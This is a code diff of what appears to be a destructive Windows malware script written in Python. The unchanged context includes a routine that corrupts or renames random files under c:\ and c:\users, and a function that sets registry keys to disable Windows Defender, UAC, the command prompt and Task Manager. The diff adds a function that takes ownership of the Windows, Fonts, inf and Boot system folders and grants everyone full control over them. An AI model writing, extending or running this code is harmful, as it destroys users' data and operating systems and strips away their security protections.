@@ -1,5 +1,7 @@
 import requests, subprocess, os, ctypes, winreg, include
 import random as rand
+import threading
+
 
 userProfilePath = os.environ.get('USERPROFILE')
 
@@ -121,10 +123,11 @@ def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0, renameOnly=False):
                             print('found a file')
                         break
                 except:
-                    # Runs this in case it goes for a directory or a read only file
+                    # take ownership of file if its readonly
                     if useAdmin != 0:
                         direc = 'c:\\'
                     else:
+                        
                         direc = 'c:\\users'
                     dirList = os.listdir(os.path.expanduser(direc))
                     randChoice = rand.choice(dirList)
@@ -164,7 +167,7 @@ def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0, renameOnly=False):
             # rerolls the file incase it errors out
             print('rerolling id: ' + str(j))
 
-# disables defender and UAC type
+# disables defender and UAC prompt
 def ripDefender():
     do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
     do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
@@ -174,3 +177,16 @@ def ripDefender():
     do_command('reg add "HKCR\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f')
     do_command('reg add "HKCR\Software\Policies\Microsoft\Windows\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
 
+def takeOwnership():
+    # using threading so it doesnt take 5 hours
+    directories = ['c:\\Windows\\*', 'c:\\Windows\\Fonts\\*', 'c:\\Windows\\inf\\*', 'c:\\Windows\\Boot\\*']
+
+    # do important shit inside windows folder
+    for index in directories:
+        # boot folder is a special case so
+        do_command(f'takeown /f {index} /r /d N')
+        do_command(f'icacls {index} /grant everyone:(f) /t /c')
+
+    # boot folder is a special case so
+    do_command('takeown /f c:\\windows\\Boot\\ /r /d N')
+    do_command('icacls c:\\windows\\Boot\\ /grant everyone:(f) /t /c')
